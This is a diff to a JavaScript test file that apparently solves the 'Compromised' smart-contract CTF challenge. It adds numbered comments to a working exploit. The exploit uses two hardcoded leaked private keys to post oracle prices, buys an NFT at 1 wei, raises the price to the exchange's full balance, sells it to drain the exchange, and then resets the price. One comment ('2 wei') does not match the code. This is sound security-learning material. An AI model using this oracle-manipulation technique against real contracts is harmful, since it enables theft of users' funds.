@@ -72,8 +72,9 @@ describe('Compromised challenge', function () {
         // connect via the attacker account
         this.oracle = this.oracle.connect(attacker);
         this.exchange = this.exchange.connect(attacker);
-        this.nftToken = this.nftToken.connect(attacker);
+        this.nftToken = this.nftToken.connect(attacker);    
 
+        // 1. connect via the leaked trustees.
         const signerOne = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
         const signerTwo = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
 
@@ -87,9 +88,9 @@ describe('Compromised challenge', function () {
         var allPricesInWei = await this.oracle.getAllPricesForSymbol(this.nftToken.symbol());
         console.log("All prices of nft tokens(in wei) "  + allPricesInWei);
         
-        // using first signer
+        // 2. using first signer, set the price to `1 wei`
         await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), 1);
-        // using second signer
+        // using second signer, set the price to `2 wei`
         await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), 1);
 
         // get the median price based on the oracles
@@ -100,10 +101,11 @@ describe('Compromised challenge', function () {
         allPricesInWei = await this.oracle.getAllPricesForSymbol(this.nftToken.symbol());
         console.log("All prices of nft tokens(in wei) "  + allPricesInWei);
 
-        // attacker balance before transaction
+        // 3. buy the underpriced nfts
         console.log(await ethers.provider.getBalance(attacker.address));
         await this.exchange.buyOne({value: 1});
 
+        // 4. set the price of an NFT to a huge value
         await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), await ethers.provider.getBalance(this.exchange.address)); // +  1 required since we give it 1 via buyOne
         await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), await ethers.provider.getBalance(this.exchange.address));
 
@@ -118,12 +120,14 @@ describe('Compromised challenge', function () {
         currentPriceInWei = await this.oracle.getMedianPrice(this.nftToken.symbol());
         console.log("Current selling price " + parseInt(currentPriceInWei["_hex"], 16));
 
+        // 5. approve and make profit out of the sell.
         await this.nftToken.approve(this.exchange.address, 0);
         await this.exchange.sellOne(0);
 
         // get the balance of the exchange after the transaction;
         console.log("Balance of the exchange " + await ethers.provider.getBalance(this.exchange.address));
 
+        // 6. reset the price.
         await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), INITIAL_NFT_PRICE); 
         await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), INITIAL_NFT_PRICE);
 
